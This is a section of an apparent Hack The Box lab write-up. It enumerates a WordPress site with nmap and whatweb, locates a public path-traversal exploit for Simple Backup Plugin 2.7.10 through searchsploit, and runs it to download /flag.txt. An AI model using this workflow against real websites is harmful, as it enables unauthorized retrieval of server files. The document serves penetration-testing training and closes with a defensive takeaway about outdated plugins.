### Section 9 — Public Exploits & Arbitrary File Retrieval

* **Objective:** Enumerate the target web service and installed plugins, locate a matching public exploit using `searchsploit`, and leverage path traversal / arbitrary file download to retrieve the flag from the root filesystem.

* **Steps & Commands:**
  1. **Service & Web Application Enumeration:**
     ```bash
     nmap -sV <TARGET_IP>
     whatweb http://<TARGET_IP>:<PORT>
     ```
     * **Finding:** Identified a WordPress instance running the vulnerable **Simple Backup Plugin 2.7.10**.

  2. **Public Exploit Discovery (`searchsploit`):**
     ```bash
     searchsploit simple backup
     searchsploit -m <EXPLOIT_ID>
     ```
     * **Finding:** Located an unauthenticated Arbitrary File Download / Path Traversal exploit (`exploit.py`) affecting Simple Backup Plugin `2.7.10`.

  3. **Exploit Execution & Flag Extraction:**
     ```bash
     python3 exploit.py http://<TARGET_IP>:<PORT> flag.txt <DEPTH>
     cat <DOWNLOADED_FILE>
     ```
     * **Finding:** Successfully traversed to the root directory (`/flag.txt`) and downloaded the target file, capturing the flag (`HTB{REDACTED}`).

* **Takeaway:** Always enumerate third-party CMS plugins and themes alongside core software versions—outdated plugins frequently introduce unauthenticated path traversal or remote code execution vulnerabilities with publicly available exploits.
